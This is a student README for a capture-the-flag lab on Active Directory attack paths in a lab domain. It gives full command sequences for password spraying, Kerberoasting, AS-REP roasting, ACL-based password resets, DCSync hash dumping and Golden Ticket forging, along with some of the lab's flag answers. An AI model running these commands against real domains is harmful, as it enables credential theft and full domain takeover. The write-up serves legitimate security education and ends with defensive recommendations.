# Active Directory — BloodHound Attack Path Analysis

## Project

**Repository:** `holbertonschool-cyber_security`
**Directory:** `Active_directory/0x04-AD_BloudHound`
**Environment:** Authorized Active Directory lab
**Domain:** `pentestlab.local`
**Domain Controller:** `DC01`
**DC IP:** `192.168.56.20`

This project focuses on Active Directory attack path analysis using BloodHound, LDAP enumeration, Kerberoasting, AS-REP Roasting, ACL abuse, DCSync, Golden Ticket generation, and SYSVOL SMB inspection.

The goal is to understand how misconfigurations in Active Directory can be chained together to move from a low-privileged user to full domain compromise, while also learning how defenders can identify and remediate these weaknesses.

---

## Lab Context

The initial low-privileged credentials provided for the project were:

```text
Username: bh_intern
Password: User@2025!
Domain: pentestlab.local
```

Common environment variables used throughout the project:

```bash
export DC_IP=192.168.56.20
export DOMAIN_FQDN="pentestlab.local"
export DOMAIN_NETBIOS="PENTESTLAB"
export BASE_DN="DC=pentestlab,DC=local"

export AD_USER="bh_intern"
export AD_PASS='User@2025!'
```

Authentication was verified with NetExec:

```bash
nxc smb $DC_IP -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN_NETBIOS"
```

A successful authentication returns:

```text
[+] PENTESTLAB\bh_intern:User@2025!
```

---

# Task 0 — BloodHound Collection Entry Point

## Objective

* Run a BloodHound collection against `pentestlab.local`.
* Enumerate all LDAP attributes of the current user.
* Retrieve the flag hidden in one of the AD profile fields.
* Store the result in `0-flag.txt`.

## BloodHound Collection

The BloodHound collection was performed with:

```bash
bloodhound-python \
  -u "$AD_USER" \
  -p "$AD_PASS" \
  -d "$DOMAIN_FQDN" \
  -ns "$DC_IP" \
  -c All
```

This collected Active Directory data such as:

```text
Users
Groups
Computers
GPOs
OUs
ACLs
Sessions
Object relationships
Potential attack paths
```

The collection successfully discovered domain objects including users, groups, computers, GPOs, OUs, and containers.

## LDAP Enumeration

To retrieve the current user profile attributes:

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$AD_USER@$DOMAIN_FQDN" \
  -w "$AD_PASS" \
  -b "$BASE_DN" \
  "(sAMAccountName=$AD_USER)" \
  "*" "+" | tee bh_intern_ldap_attributes.txt
```

Useful fields were filtered with:

```bash
grep -Ei "flag|description|info|comment|adminDescription|wWWHomePage|employeeID|employeeNumber|pager|title|department" bh_intern_ldap_attributes.txt
```

The flag was found in the `pager` attribute.

## Result

```bash
echo 'BHFLAG0{BL00DH0UND_C0LL3CT10N_ST4RT_F0}' > 0-flag.txt
```

---

# Task 1 — Password Spray + GenericAll ACL Discovery

## Objective

* Extract the domain user list.
* Perform a password spray using the default company password.
* Identify the IT Support account.
* Authenticate as the discovered account.
* Enumerate its LDAP attributes.
* Retrieve the flag from a telephone field.
* Store the result in `1-flag.txt`.

## Extract Domain Users

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$AD_USER@$DOMAIN_FQDN" \
  -w "$AD_PASS" \
  -b "$BASE_DN" \
  "(&(objectCategory=person)(objectClass=user))" \
  sAMAccountName | awk '/^sAMAccountName: / {print $2}' | sort -u > domain_users.txt
```

## Password Spray

```bash
nxc smb $DC_IP \
  -u domain_users.txt \
  -p 'User@2025!' \
  -d "$DOMAIN_NETBIOS" \
  --continue-on-success | tee spray_results.txt
```

Successful authentications were filtered with:

```bash
grep "\[+\]" spray_results.txt
```

The account `bh_helpdesk` was identified as a valid account using the default password.

```bash
export HELP_USER="bh_helpdesk"
export HELP_PASS='User@2025!'
```

Authentication was confirmed with:

```bash
nxc smb $DC_IP -u "$HELP_USER" -p "$HELP_PASS" -d "$DOMAIN_NETBIOS"
```

## LDAP Enumeration

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$HELP_USER@$DOMAIN_FQDN" \
  -w "$HELP_PASS" \
  -b "$BASE_DN" \
  "(sAMAccountName=$HELP_USER)" \
  "*" "+" | tee bh_helpdesk_ldap_attributes.txt
```

Telephone-related attributes were searched with:

```bash
grep -Ei "flag|telephone|telephoneNumber|homePhone|mobile|ipPhone|otherTelephone|pager" bh_helpdesk_ldap_attributes.txt
```

The flag was found in the `telephoneNumber` attribute.

## Result

```bash
echo 'BHFLAG1{G3N3R1C4LL_4BUS3_P4TH_F1}' > 1-flag.txt
```

---

# Task 2 — Kerberoasting: svc_backup

## Objective

* Enumerate Kerberoastable accounts.
* Request a TGS ticket for `svc_backup`.
* Crack the ticket offline.
* Authenticate as `svc_backup`.
* Retrieve the flag from the `homeDirectory` attribute.
* Store the result in `2-flag.txt`.

## Enumerate Kerberoastable Accounts

Kerberoastable accounts are accounts with a Service Principal Name, also known as an SPN.

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$AD_USER@$DOMAIN_FQDN" \
  -w "$AD_PASS" \
  -b "$BASE_DN" \
  "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName description | tee kerberoastable_accounts.txt
```

## Request TGS Tickets

```bash
impacket-GetUserSPNs \
  "$DOMAIN_FQDN/$AD_USER:$AD_PASS" \
  -dc-ip "$DC_IP" \
  -request \
  -outputfile kerberoast_hashes.txt
```

The `svc_backup` hash was isolated:

```bash
grep -i "svc_backup" kerberoast_hashes.txt > svc_backup.hash
```

## Crack the Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt svc_backup.hash
john --show svc_backup.hash
```

The recovered password was:

```text
svc_backup:Password1
```

## Authenticate as svc_backup

```bash
export SVC_USER="svc_backup"
export SVC_PASS='Password1'
```

```bash
nxc smb $DC_IP -u "$SVC_USER" -p "$SVC_PASS" -d "$DOMAIN_NETBIOS"
```

## LDAP Enumeration

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$SVC_USER@$DOMAIN_FQDN" \
  -w "$SVC_PASS" \
  -b "$BASE_DN" \
  "(sAMAccountName=$SVC_USER)" \
  "*" "+" | tee svc_backup_ldap_attributes.txt
```

The flag was searched in `homeDirectory`:

```bash
grep -Ei "flag|homeDirectory|homeDrive|profilePath|scriptPath" svc_backup_ldap_attributes.txt
```

## Result

```bash
echo 'BHFLAG2{REPLACE_WITH_FOUND_FLAG}' > 2-flag.txt
```

---

# Task 3 — AS-REP Roasting: jmartin

## Objective

* Identify accounts with Kerberos pre-authentication disabled.
* Capture the AS-REP hash without valid credentials.
* Crack the hash offline.
* Authenticate as `jmartin`.
* Retrieve the flag from `employeeType`.
* Store the result in `3-flag.txt`.

## Concept

AS-REP Roasting targets accounts with the following Active Directory property:

```text
DoesNotRequirePreAuth
```

This corresponds to the `userAccountControl` flag:

```text
DONT_REQ_PREAUTH = 4194304
```

If this setting is enabled, an unauthenticated attacker can request an encrypted AS-REP response and crack it offline.

## Capture AS-REP Hashes

Using a domain user list:

```bash
impacket-GetNPUsers \
  "$DOMAIN_FQDN/" \
  -dc-ip "$DC_IP" \
  -usersfile domain_users.txt \
  -no-pass \
  -request \
  -outputfile asrep_hashes.txt
```

The `jmartin` hash was isolated:

```bash
grep -i "jmartin" asrep_hashes.txt > jmartin_asrep.hash
```

## Crack the Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt jmartin_asrep.hash
john --show jmartin_asrep.hash
```

Alternatively, with Hashcat:

```bash
hashcat -m 18200 -a 0 jmartin_asrep.hash /usr/share/wordlists/rockyou.txt
hashcat -m 18200 jmartin_asrep.hash --show
```

## Authenticate as jmartin

```bash
export ASREP_USER="jmartin"
export ASREP_PASS='REPLACE_WITH_CRACKED_PASSWORD'
```

```bash
nxc smb $DC_IP -u "$ASREP_USER" -p "$ASREP_PASS" -d "$DOMAIN_NETBIOS"
```

## LDAP Enumeration

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$ASREP_USER@$DOMAIN_FQDN" \
  -w "$ASREP_PASS" \
  -b "$BASE_DN" \
  "(sAMAccountName=$ASREP_USER)" \
  "*" "+" | tee jmartin_ldap_attributes.txt
```

The flag was searched in `employeeType`:

```bash
grep -Ei "flag|employeeType|employeeID|employeeNumber|description|info|comment" jmartin_ldap_attributes.txt
```

## Result

```bash
echo 'BHFLAG3{REPLACE_WITH_FOUND_FLAG}' > 3-flag.txt
```

---

# Task 4 — Disabled Account Enumeration: bh_auditor

## Objective

* Query LDAP for disabled accounts using the `userAccountControl` bitmask filter.
* Identify `bh_auditor` in the `BH-Users` OU.
* Enumerate all its attributes.
* Retrieve the flag from `otherTelephone`.
* Store the result in `4-flag.txt`.

## LDAP Filter for Disabled Accounts

A disabled account has the following `userAccountControl` bit:

```text
ACCOUNTDISABLE = 2
```

The LDAP matching rule used is:

```text
userAccountControl:1.2.840.113556.1.4.803:=2
```

## Search Disabled Accounts

```bash
export BH_USERS_DN="OU=BH-Users,OU=BH-Project,DC=PENTESTLAB,DC=local"
```

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$AD_USER@$DOMAIN_FQDN" \
  -w "$AD_PASS" \
  -b "$BH_USERS_DN" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
  cn sAMAccountName distinguishedName userAccountControl
```

## Enumerate bh_auditor Attributes

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$AD_USER@$DOMAIN_FQDN" \
  -w "$AD_PASS" \
  -b "$BH_USERS_DN" \
  "(sAMAccountName=bh_auditor)" \
  "*" "+" | tee bh_auditor_ldap_attributes.txt
```

## Extract the Flag

```bash
grep -Ei "flag|otherTelephone|telephone|mobile|homePhone|ipPhone|pager" bh_auditor_ldap_attributes.txt
```

The flag was located in:

```text
otherTelephone
```

## Result

```bash
echo 'BHFLAG4{REPLACE_WITH_FOUND_FLAG}' > 4-flag.txt
```

---

# Task 5 — Full Attack Chain: DCSync and Golden Ticket

## Objective

* Perform a password spray.
* Compromise `bh_helpdesk`.
* Abuse `GenericAll` to reset the `bh_sysadmin` password.
* Enumerate `bh_sysadmin.homePhone`.
* Retrieve the task flag.
* Perform DCSync to dump `Administrator` and `krbtgt` NTLM hashes.
* Forge a Golden Ticket.
* Authenticate to the DC using the forged ticket.
* Store the result in `5-flag.txt`.

## Step 1 — Password Spray

```bash
nxc smb $DC_IP \
  -u domain_users.txt \
  -p 'User@2025!' \
  -d "$DOMAIN_NETBIOS" \
  --continue-on-success | tee spray_task5.txt
```

Filter successful authentications:

```bash
grep "\[+\]" spray_task5.txt
```

The relevant account was:

```text
bh_helpdesk
```

```bash
export HELP_USER="bh_helpdesk"
export HELP_PASS='User@2025!'
```

## Step 2 — Reset bh_sysadmin Password with bloodyAD

Install `bloodyAD` if needed:

```bash
sudo apt install bloodyad -y
```

Set the target account and new password:

```bash
export SYSADMIN_USER="bh_sysadmin"
export SYSADMIN_PASS='SysAdmin@2026!'
```

Reset the password:

```bash
bloodyAD \
  --host "$DC_IP" \
  -d "$DOMAIN_FQDN" \
  -u "$HELP_USER" \
  -p "$HELP_PASS" \
  set password "$SYSADMIN_USER" "$SYSADMIN_PASS"
```

If `--host` with the IP does not work, add the DC to `/etc/hosts`:

```bash
sudo sh -c 'echo "192.168.56.20 dc01.pentestlab.local dc01 pentestlab.local" >> /etc/hosts'
```

Then retry with:

```bash
bloodyAD \
  --host "dc01.pentestlab.local" \
  --dc-ip "$DC_IP" \
  --dns "$DC_IP" \
  -d "$DOMAIN_FQDN" \
  -u "$HELP_USER" \
  -p "$HELP_PASS" \
  set password "$SYSADMIN_USER" "$SYSADMIN_PASS"
```

Confirm the new credentials:

```bash
nxc smb $DC_IP -u "$SYSADMIN_USER" -p "$SYSADMIN_PASS" -d "$DOMAIN_NETBIOS"
```

## Step 3 — Enumerate bh_sysadmin and Extract the Flag

```bash
ldapsearch -LLL -x \
  -H ldap://$DC_IP \
  -D "$SYSADMIN_USER@$DOMAIN_FQDN" \
  -w "$SYSADMIN_PASS" \
  -b "$BASE_DN" \
  "(sAMAccountName=$SYSADMIN_USER)" \
  "*" "+" | tee bh_sysadmin_ldap_attributes.txt
```

Search for the flag:

```bash
grep -Ei "flag|homePhone|telephone|mobile|pager|otherTelephone" bh_sysadmin_ldap_attributes.txt
```

The flag is expected in:

```text
homePhone
```

## Result

```bash
echo 'BHFLAG5{REPLACE_WITH_FOUND_FLAG}' > 5-flag.txt
```

## Step 4 — DCSync

DCSync was performed with Impacket `secretsdump`:

```bash
impacket-secretsdump \
  "$DOMAIN_FQDN/$SYSADMIN_USER:$SYSADMIN_PASS@$DC_IP" \
  -dc-ip "$DC_IP" \
  -just-dc | tee dcsync_domain_hashes.txt
```

Useful hashes were filtered with:

```bash
grep -Ei "Administrator:|krbtgt:" dcsync_domain_hashes.txt
```

The important targets are:

```text
Administrator NTLM hash
krbtgt NTLM hash
```

## Step 5 — Retrieve the Domain SID

```bash
impacket-lookupsid \
  "$DOMAIN_FQDN/$SYSADMIN_USER:$SYSADMIN_PASS@$DC_IP" \
  -dc-ip "$DC_IP" | tee domain_sid.txt
```

The domain SID format is:

```text
S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

## Step 6 — Forge a Golden Ticket

Set the required variables:

```bash
export KRBTGT_NTLM="REPLACE_WITH_KRBTGT_NTLM_HASH"
export DOMAIN_SID="S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
```

Create the Golden Ticket:

```bash
impacket-ticketer \
  -nthash "$KRBTGT_NTLM" \
  -domain-sid "$DOMAIN_SID" \
  -domain "$DOMAIN_FQDN" \
  Administrator
```

This generates:

```text
Administrator.ccache
```

Load the ticket:

```bash
export KRB5CCNAME=Administrator.ccache
klist
```

## Step 7 — Authenticate to the DC with the Golden Ticket

Using Impacket:

```bash
impacket-smbclient \
  -k \
  -no-pass \
  "$DOMAIN_FQDN/Administrator@dc01.pentestlab.local"
```

Using `smbclient`:

```bash
smbclient --use-kerberos=required //dc01.pentestlab.local/C$ -c 'dir'
```

or:

```bash
smbclient -k //dc01.pentestlab.local/C$ -c 'dir'
```

---

# Task 6 — SYSVOL SMB Leak

## Objective

* Connect to the `SYSVOL` SMB share using low-privileged credentials.
* Enumerate accessible folders.
* Locate `bh_notes.txt` inside the `scripts` directory.
* Retrieve and read the file.
* Extract the hidden flag.
* Store the result in `6-flag.txt`.

## Connect to SYSVOL

```bash
smbclient "//$DC_IP/SYSVOL" -W "$DOMAIN_NETBIOS" -U "$AD_USER%$AD_PASS"
```

Inside the SMB shell:

```smb
ls
cd PENTESTLAB.local
ls
cd scripts
ls
get bh_notes.txt
exit
```

The file was located at:

```text
SYSVOL/PENTESTLAB.local/scripts/bh_notes.txt
```

## Read the File Locally

After downloading the file with `get`, it exists locally in the current directory.

```bash
cat bh_notes.txt
```

Search for the flag:

```bash
grep -Ei "flag|BHFLAG|BH-F|FLAG" bh_notes.txt
```

Optional extraction:

```bash
grep -Eo 'BHFLAG6\{[^}]+\}|BH-F6\{[^}]+\}|FLAG6\{[^}]+\}' bh_notes.txt
```

## Result

```bash
echo 'BHFLAG6{REPLACE_WITH_FOUND_FLAG}' > 6-flag.txt
```

---

# Troubleshooting Notes

## 1. `cat` does not work inside smbclient

Inside `smbclient`, the command `cat` is not available.

Correct workflow:

```smb
get bh_notes.txt
exit
```

Then from the Kali terminal:

```bash
cat bh_notes.txt
```

## 2. `bloodyAD -H` error

Some versions of `bloodyAD` do not support `-H`.

Use:

```bash
--host
```

Correct example:

```bash
bloodyAD \
  --host "$DC_IP" \
  -d "$DOMAIN_FQDN" \
  -u "$HELP_USER" \
  -p "$HELP_PASS" \
  set password "$SYSADMIN_USER" "$SYSADMIN_PASS"
```

## 3. John says: `No password hashes left to crack`

This usually means John already cracked the hash and stored it in its pot file.

Display the result with:

```bash
john --show hashfile.txt
```

## 4. BloodHound warning with unrelated flags

During BloodHound collection, warnings may expose values from other tasks.
For each task, always follow the objective carefully and retrieve the flag from the requested attribute.

Example:

```text
Task 0: pager
Task 1: telephoneNumber
Task 2: homeDirectory
Task 3: employeeType
Task 4: otherTelephone
Task 5: homePhone
Task 6: bh_notes.txt in SYSVOL
```

---

# Key Concepts Learned

## BloodHound Collection

BloodHound maps Active Directory relationships and helps identify privilege escalation paths.

## LDAP Enumeration

LDAP allows direct querying of users, groups, computers, OUs, and their attributes.

## Password Spraying

Password spraying tests one common password across many users to avoid account lockout risks.

## GenericAll ACL Abuse

`GenericAll` gives broad control over an Active Directory object and may allow password reset or privilege escalation.

## Kerberoasting

Kerberoasting abuses SPN-configured service accounts by requesting TGS tickets and cracking them offline.

## AS-REP Roasting

AS-REP Roasting targets accounts without Kerberos pre-authentication.

## Disabled Account Enumeration

Disabled accounts still exist in LDAP and may contain sensitive information in their attributes.

## DCSync

DCSync abuses domain replication privileges to extract password hashes from Active Directory.

## Golden Ticket

A Golden Ticket is a forged Kerberos TGT created using the `krbtgt` hash.

## SYSVOL SMB Leak

SYSVOL is readable by authenticated users and may expose scripts, notes, credentials, or administrative files.

---

# Security Recommendations

To prevent these attack paths in real Active Directory environments:

```text
1. Disable default or weak passwords.
2. Enforce strong password policies.
3. Monitor password spraying attempts.
4. Review SPN-enabled service accounts.
5. Rotate service account passwords regularly.
6. Use Group Managed Service Accounts where possible.
7. Remove unnecessary GenericAll, GenericWrite, WriteDACL, and WriteOwner permissions.
8. Monitor privileged group membership changes.
9. Disable Kerberos pre-authentication exceptions unless strictly required.
10. Audit disabled accounts and remove sensitive attributes.
11. Restrict DCSync rights to Domain Controllers only.
12. Monitor Event IDs related to Kerberos, logons, and replication.
13. Review SYSVOL and NETLOGON for sensitive files.
14. Remove passwords and secrets from scripts and GPO files.
15. Apply least privilege across all AD objects.
```

---

# Final Project Structure

Expected files:

```text
Active_directory/0x04-AD_BloudHound/
├── 0-flag.txt
├── 1-flag.txt
├── 2-flag.txt
├── 3-flag.txt
├── 4-flag.txt
├── 5-flag.txt
├── 6-flag.txt
├── README.md
├── domain_users.txt
├── kerberoast_hashes.txt
├── asrep_hashes.txt
├── bh_intern_ldap_attributes.txt
├── bh_helpdesk_ldap_attributes.txt
├── svc_backup_ldap_attributes.txt
├── jmartin_ldap_attributes.txt
├── bh_auditor_ldap_attributes.txt
├── bh_sysadmin_ldap_attributes.txt
└── bh_notes.txt
```

Only the `*-flag.txt` files are required for validation, but the supporting files are useful for documentation and review.

---

# Conclusion

This project demonstrated how multiple Active Directory weaknesses can be discovered and exploited in a controlled lab environment.

The attack path started with low-privileged credentials and progressively moved through:

```text
BloodHound collection
LDAP enumeration
Password spraying
GenericAll ACL abuse
Kerberoasting
AS-REP Roasting
Disabled account discovery
DCSync
Golden Ticket generation
SYSVOL SMB inspection
```

The main lesson is that Active Directory security depends not only on passwords, but also on permissions, object relationships, Kerberos configuration, exposed shares, and long-term administrative hygiene.

A small misconfiguration can become dangerous when chained with others.

